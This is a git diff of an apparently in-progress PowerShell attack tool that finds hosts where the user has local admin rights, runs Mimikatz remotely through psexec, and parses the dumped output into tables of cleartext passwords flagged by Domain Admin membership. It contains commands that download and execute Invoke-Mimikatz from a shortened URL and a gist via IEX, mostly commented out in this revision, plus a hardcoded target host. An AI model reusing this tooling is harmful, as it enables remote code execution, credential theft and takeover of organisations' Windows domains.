@@ -41,8 +41,23 @@ $global:i=0
 $invocation = (Get-Variable MyInvocation).Value
 $directorypath = Split-Path $invocation.MyCommand.Path
 $recon = $directorypath + '\Recon\Recon.psd1'
-$global:da = @()
-$global:da_found = @()
+#$global:da = @()
+#$global:da_found = @()
+
+$TableResults = New-Object System.Data.DataTable 
+#$TblCredStore.Columns.Add("PwType") | Out-Null
+$TableResults.Columns.Add("Domain") | Out-Null
+$TableResults.Columns.Add("Username") | Out-Null
+$TableResults.Columns.Add("Password") | Out-Null
+$TableResults.Columns.Add("IsDomainAdmin") | Out-Null 
+$TableResults.Clear()
+
+
+
+
+
+
+
 
 ## Import Recon.psd1 tools/commands/helpers, courtesy of PowerSploit
 write-host $recon
@@ -61,7 +76,7 @@ write-host "Downloading external content to memory...`r`n"
 # Mimikatz parse function (Will Schoeder's) 
 # ----------------------------------------
 
-# This is a heavily modded version of will schroeder's function from:
+# This is a *heavily customized* version of will schroeder's function from:
 # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
 function Parse-Mimikatz {
 
@@ -69,14 +84,15 @@ function Parse-Mimikatz {
     param(
         [string]$raw
     )
-    
+    write-host "Parsing..."
     # Create data table to house results
     $TblPasswords = New-Object System.Data.DataTable 
     $TblPasswords.Columns.Add("PwType") | Out-Null
     $TblPasswords.Columns.Add("Domain") | Out-Null
     $TblPasswords.Columns.Add("Username") | Out-Null
     $TblPasswords.Columns.Add("Password") | Out-Null
-    $TblPasswords.Columns.Add("IsDomainAdmin") | Out-Null    
+    $TblPasswords.Columns.Add("IsDomainAdmin") | Out-Null 
+    $TblPasswords.Columns.Add("PasswordCaptured") | Out-Null   
 
     # msv
 	<#$results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
@@ -108,8 +124,9 @@ function Parse-Mimikatz {
             }
         }
     }#>
-    $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
+    <#$results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
     if($results){
+        $Section = "tspkg - wdigest"
         foreach($match in $results){
             if($match.Contains("Domain")){
                 #write-host "Match is $match"
@@ -119,11 +136,19 @@ function Parse-Mimikatz {
                     write-host "$line"
                     if ($line.Contains("Username")){
                         $username = $($line.split('*')[5].trim()).ToLower()
-                        #write-host "$username is the username"
-                        $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username)
-                        if($WindowsPrincipal.IsInRole("Domain Admins")) {
-                            $IsDomainAdmin = "Yes"
+                        write-host "$username is the username"
+                        #$IsDomainAdmin = "No"
+                        <#if ($username -ne "(null)") {
+                            $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username)
+                            if($WindowsPrincipal.IsInRole("Domain Admins")) {
+                                write-host "DA!"
+                                #$IsDomainAdmin = $WindowsPrincipal
+                                }
                             }
+                            Else {
+                                write-host "$username IS NOT DA"
+                                $IsDomainAdmin = "No"
+                                }
                     }
                     #if ($line.Contains("Domain")){
                     #    $domain = $line.split("*")[10].trim()
@@ -136,34 +161,33 @@ function Parse-Mimikatz {
                     }
                 }
                 if ($password -and $($password -ne "(null)")){
-                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password,$IsDomainAdmin) | Out-Null
+                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password,$IsDomainAdmin,$Section) | Out-Null
                 }
             }
         }
-    }
+    }#>
     $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
     if($results){
+    $Section =  "wdigest - kerberos"
         foreach($match in $results){
             if($match.Contains("Domain")){
                 #write-host "Match is $match"
                 $lines = $match -replace '\s+', '*'
                 #write-host "Lines is $lines"
                 foreach($line in $lines){
-                    write-host "$line"
+                    #write-host "$line"
                     if ($line.Contains("Username")){
                         $username = $($line.split('*')[5].trim()).ToLower()
-                        #write-host "$username is the username"
-                        $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username)
-                        if($WindowsPrincipal.IsInRole("Domain Admins")) {
-                            #write-host "DOMAIN ADMIN!"
-                            #write-host $_.username
-                            $da = New-Object ([PsObject])
-                            $da | Add-Member -NotePropertyName IsDomainAdmin -NotePropertyValue Yes
-                            $da | Add-Member -NotePropertyName User -NotePropertyValue $_.username
-                            $da | Add-Member -NotePropertyName password -NotePropertyValue $_.password
-                            $global:da_found += $da
-                            #write-host $da
-                            $IsDomainAdmin = "Yes"
+                        
+                        if ($username -ne "(null)") {
+                            $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username)
+                            if($WindowsPrincipal.IsInRole("Domain Admins")) {
+                                $IsDomainAdmin = "Yes"
+                                }
+                            Else {
+                                #write-host "$username IS NOT DA"
+                                $IsDomainAdmin = "No"
+                                }
                             }
                     }
                     #if ($line.Contains("Domain")){
@@ -174,37 +198,38 @@ function Parse-Mimikatz {
                         $Pwtype = "Cleartext"
                         $password = $line.split("*")[15].trim()
                         #write-host "$password is the password"
+                        
                     }
                 }
                 if ($password -and $($password -ne "(null)")){
-                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
+                    $PasswordCaptured = "Yes"
+                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password, $isdomainadmin, $PasswordCaptured) | Out-Null
                 }
             }
         }
     }
     $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
     if($results){
+    $Section =  "kerberos - ssp"
         foreach($match in $results){
             if($match.Contains("Domain")){
                 #write-host "Match is $match"
                 $lines = $match -replace '\s+', '*'
                 #write-host "Lines is $lines"
                 foreach($line in $lines){
-                    write-host "$line"
+                    #write-host "$line"
                     if ($line.Contains("Username")){
                         $username = $($line.split('*')[5].trim()).ToLower()
-                        #write-host "$username is the username"
-                        $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username)
-                        if($WindowsPrincipal.IsInRole("Domain Admins")) {
-                            #write-host "DOMAIN ADMIN!"
-                            #write-host $_.username
-                            $da = New-Object ([PsObject])
-                            $da | Add-Member -NotePropertyName IsDomainAdmin -NotePropertyValue Yes
-                            $da | Add-Member -NotePropertyName User -NotePropertyValue $_.username
-                            $da | Add-Member -NotePropertyName password -NotePropertyValue $_.password
-                            $global:da_found += $da
-                            #write-host $da
-                            $IsDomainAdmin = "Yes"
+                        
+                        if ($username -ne "(null)") {
+                            $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username)
+                            if($WindowsPrincipal.IsInRole("Domain Admins")) {                                
+                                $IsDomainAdmin = "Yes"
+                                }
+                            Else {
+                                #write-host "$username IS NOT DA"
+                                $IsDomainAdmin = "No"
+                                }
                             }
                     }
                     #if ($line.Contains("Domain")){
@@ -215,18 +240,20 @@ function Parse-Mimikatz {
                         $Pwtype = "Cleartext"
                         $password = $line.split("*")[15].trim()
                         #write-host "$password is the password"
+                        
                     }
                 }
                 if ($password -and $($password -ne "(null)")){
-                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
+                    $PasswordCaptured = "Yes"
+                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password, $isdomainadmin, $PasswordCaptured) | Out-Null
                 }
             }
         }
     }
 
     # Remove the computer accounts
-    $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}
-    
+    $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"} # | where-object { $_.IsDomainAdmin -eq ("Yes" -or "No")}
+   
 
     return $TblPasswords_Clean
 }
@@ -240,49 +267,58 @@ $file = "C:\Logs\admin_list_$user.txt"
 $LA = $null
 
 ## Do we write a log file (locally) or is there one already?
+$Global:ServerList = New-Object System.Data.Datatable
+$Global:Serverlist.Columns.Add("Item") | Out-Null
+$Global:Serverlist.Columns.Add("Server") | Out-Null
 function checklog {
     $return = Test-Path $file
+    write-host "Checking for log...."
+    #$Serverlist.Clear()
     if ($return) {
-        $Global:ServerList = @()
-        $Global:i = 0
+        
+        
         $LA = Get-Content $file | where { $_ -notcontains ("DPSE" -or "LPSE")}
-        write-host $global:i " = Global:i"
+        #write-host $global:i " = Global:i"
         foreach ($Server in $LA) {
+            if ($Serverlist -notcontains $Server){
             $global:i++
-            $ServerObj = New-Object System.Object
-            $ServerObj | Add-Member -type NoteProperty -name Item -value $global:i
-            $ServerObj | Add-Member -type NoteProperty -name Server -value $Server
-            $Global:ServerList += $ServerObj
+            $i = $global:i
+            $Global:ServerList.Rows.Add($i,$Server) | Out-Null
+            }
         }
     }
-    else {
-        write-host "Log: $file not found.  You need to find machines with LocalAdmin first."
-
-    }
+    #$ServerList | select item, server -unique
+    $Global:dw = New-Object System.Data.DataView($Global:Serverlist)
     return $return
 }
-
+$Global:Serverlist | select item, server -unique
 
             # ----------------------------------------
             # Setup required data tables
             # ----------------------------------------
 
             # Create data table to house results to return
-            $TblPasswordList = New-Object System.Data.DataTable 
-            $TblPasswordList.Columns.Add("Type") | Out-Null
-            $TblPasswordList.Columns.Add("Domain") | Out-Null
-            $TblPasswordList.Columns.Add("Username") | Out-Null
-            $TblPasswordList.Columns.Add("Password") | Out-Null  
-            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
-            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
-            $TblPasswordList.Clear()
+            #$TblPasswordList = New-Object System.Data.DataTable 
+            #$TblPasswordList.Columns.Add("Type") | Out-Null
+            #$TblPasswordList.Columns.Add("Domain") | Out-Null
+            #$TblPasswordList.Columns.Add("Username") | Out-Null
+            #$TblPasswordList.Columns.Add("Password") | Out-Null  
+            #$TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
+            #$TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
+            #$TblPasswordList.Clear()
 
              # Create data table to house results
-            $TblServers = New-Object System.Data.DataTable 
-            $TblServers.Columns.Add("ComputerName") | Out-Null
+            $TblCredStore = New-Object System.Data.DataTable 
+            #$TblCredStore.Columns.Add("PwType") | Out-Null
+            $TblCredStore.Columns.Add("Domain") | Out-Null
+            $TblCredStore.Columns.Add("Username") | Out-Null
+            $TblCredStore.Columns.Add("Password") | Out-Null
+            $TblCredStore.Columns.Add("IsDomainAdmin") | Out-Null 
+            #$TblCredStore.Columns.Add("PasswordCaptured") | Out-Null
+            
 
 $checklog = checklog
-
+$count = @($Global:Serverlist).count
 ## Greetings
 do {
 write-host "*******************************"
@@ -295,6 +331,7 @@ write-host "*******************************`r`n"
 write-host "Whoami:`t$domain\\$user@$env:computername`r"
 write-host "IsLocalAdmin:`t", $(Invoke-CheckLocalAdminAccess -ComputerName $env:computername).IsAdmin "`r"
 write-host "Log exists for current user:`t" $checklog
+write-host "Servers in log: $count"
 write-host "`r`n"
 Write-host "Please choose from the following options:`r`n"
 write-host "1) Find machines where I have local admin"
@@ -311,42 +348,26 @@ if ($chosen -eq 99) {
 
     $global:rhost = "SBOTCAR1.puget.com"           
     [string]$mim = Get-Content ".\mim_$global:rhost.log"
-    $Global:TableResults = Parse-Mimikatz -raw $mim
-    $Global:TableResults | select username, domain, password -unique | foreach-object {
-        $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($_.username)
-        if($WindowsPrincipal.IsInRole("Domain Admins")) {
-            write-host "DOMAIN ADMIN!"
-            write-host $_.username
-            $da = New-Object ([PsObject])
-            $da | Add-Member -NotePropertyName IsDomainAdmin -NotePropertyValue Yes
-            $da | Add-Member -NotePropertyName User -NotePropertyValue $_.username
-            $da | Add-Member -NotePropertyName password -NotePropertyValue $_.password
-            $global:da_found += $da
-            write-host $da
+    $TableResults = Parse-Mimikatz -raw $mim
+    $TableResults | select username, domain, password -unique | foreach-object {
 
             
             
-            
-            #$global:TableResults.username[$i] | Add-Member -NotePropertyName IsDomainAdmin -NotePropertyValue Yes
-            #$i++
-            }
-        else
-            {
-            write-host "NOT DOMAIN ADMIN!"
-            #$global:TableResults.Username[$i] | Add-Member -NotePropertyName IsDomainAdmin -NotePropertyValue No
-            #$i++
-            }
-        }
-        $global:da_found | select user, password, isdomainadmin
-    #write-host $global:TableResults | select *
-            
         
+        $global:da_found | select user, password, isdomainadmin
+    #write-host $TableResults | select *
+            
+   }     
+}
+
+if ($chosen -eq 11) {
+    write-host "Here is the current server count: $count"
 }
 
 ### Option 1
 if ($chosen -eq 1) {
     $newlog = "Y"
-    If (checklog)
+    If ($checklog)
         { 
             $newlog = read-host "Logs exists for $user.  New log?  [Y] or [N]/(Default)" 
             if (($newlog -eq "Y") -or ($newlog -eq "y")) {
@@ -397,9 +418,7 @@ if ($chosen -eq 2) {
 write-host "`r`n"
 write-host "---------------------------"
 write-host "Machines with LocalAdmin`r`n`n"
-        if (checklog) {
-            $ServerList | Sort-Object Item
-        }
+        $dw | Out-GridView
 write-host "---------------------------"
 write-host "`r`n"
 read-host "Press any key to continue..."
@@ -409,81 +428,94 @@ read-host "Press any key to continue..."
 
 ### Option 3
 if ($chosen -eq 3) {
-    if (checklog) {
-        write-host "checklog = true"
-        if ($ServerList -ne $null) {
-        $ServerList
+
+        if ($count -gt 0) {
+        $Global:ServerList | select item,server -unique | format-table -autosize
         write-host "0 : Exit"
         $r = Read-Host "Select a Server to pwn"
         write-host $r
             if ($r -ne 0) {
+      ######################      $global:rhost = $serverlist.Server[$r-1]
             
-                $global:rhost = $ServerList.Server[$r-1]
-                read-host "$global:rhost Chosen...."
-
-                 .\psexec -accepteula \\$global:rhost powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds" |
-                    Out-file ".\mim_$global:rhost.log"
+            $global:rhost = "SBOTCAR1.puget.com"
+            #write-host $global:rhost 
+            
+            #.\psexec -accepteula \\$global:rhost powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds" |
+            #Out-file ".\mim_$global:rhost.log"
                 
+                #[string]$mim = Get-Content ".\mim_$global:rhost.log"
+                #write-host (test-path ".\mim_$global:rhost.log")
+                #write-host $global:rhost 
+                    
+                        #$TableResults = Parse-Mimikatz -raw $mim
+                    #if ($TableResults -ne $null) {
+        
+                        #$TableResults
+       
+        
+                        #read-host "..........."
+         
+                        #}
+
+                #$TableResults | select domain, user, password -unique | format-table -autosize
+               
                 [string]$mim = Get-Content ".\mim_$global:rhost.log"
-                
-                $Global:TableResults = Parse-Mimikatz -raw $mim
-
-                $Global:TableResults | foreach {
-            
-                    [string]$pwtype = $_.pwtype.ToLower()
-                    [string]$pwdomain = $_.domain.ToLower()
-                    [string]$pwusername = $_.username.ToLower()
-                    [string]$pwpassword = $_.password
+                    $Global:TableResults = Parse-Mimikatz -raw $mim
+                if ($Global:TableResults -ne $null) {
                     
-                    # Check if user has da/ea privs - requires autotarget
-                    if ($AutoTarget)
-                    {
-                        $ea = "No"
-                        $da = "No"
-
-                        # Check if user is enterprise admin                   
-                        $EnterpriseAdmins |
-                        ForEach-Object {
-                            $EaUser = $_.GroupMember
-                            if ($EaUser -eq $pwusername){
-                                $ea = "Yes"
-                            }
-                        }
                     
-                        # Check if user is domain admin
-                        $DomainAdmins |
-                        ForEach-Object {
-                            $DaUser = $_.GroupMember
-                            if ($DaUser -eq $pwusername){
-                                $da = "Yes"
-                            }
-                        }
-                    }else{
-                        $ea = "Unknown"
-                        $da = "Unknown"
+                    $Global:TableResults | select username,domain,isdomainadmin -unique | format-table -autosize
+                    
+        
+                    read-host "..........."
+         
                     }
-
+                else {
+                   read-host "Need to find some passwords, first"
+                    }
+        
+                    
+                $Global:TableResults | foreach {
+                    #write-host $_
+                    #[string]$pwtype = $_.pwtype.ToLower()
+                    $domain = $_.domain.ToLower()
+                    write-host $domain
+                    $username = $_.username.ToLower()
+                    write-host $username
+                    $password = $_.password
+                    write-host $password
+                    $isdomainadmin = $_.isdomainadmin
+                    write-host $isdomainadmin
+                    $TblCredStore.Rows.Add($domain,$username,$password,$isdomainadmin) | Out-Null
+                        
+                        
                     # Add credential to list
-                    $TableServers.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
+                    
                 }            
 
-                $TablePasswordList | select type,domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
+                #$TablePasswordList | select type,domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                 
                 #IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/HarmJ0y/c84065c0c487d4c74cc1/raw/70e01dfc466eaaf0e6e6ef331e9ab7d3960d1902/Invoke-Psexec.ps1')
                 #Invoke-PsExec -ComputerName $rhost -Command "powershell `"IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds`""
             }
         }
-    }
+    #} 
+    #$TableResults = @()
 }
-
 
 #Option 4
 if ($chosen -eq 4) {
-    $global:rhost = "SBOTCAR1.puget.com" 
-    if ($global:rhost -ne $null) {
-        [string]$mim = Get-Content ".\mim_$global:rhost.log"
-        $Global:TableResults = Parse-Mimikatz -raw $mim
-        $Global:TableResults | select username, domain, password, isdomainadmin -unique    
+    #$serverlist.Clear()
+    #$TableResults = @()
+    #$rhost = "SBOTCAR1.puget.com"
+    #write-host $rhost 
+    #[string]$mim = Get-Content ".\mim_$rhost.log"
+    #write-host $mim
+        #$TblCredStore = Parse-Mimikatz -raw $mim
+    if ($TblCredStore -ne $null) {
+        
+        $TblCredStore | select username,domain,isdomainadmin -unique | format-table -autosize
+        
         
         read-host "..........."
          
@@ -508,3 +540,4 @@ if ($chosen -eq 6) {
 
 ### exit
 } while ($chosen -ne 0)
+$Global:serverlist.Clear()
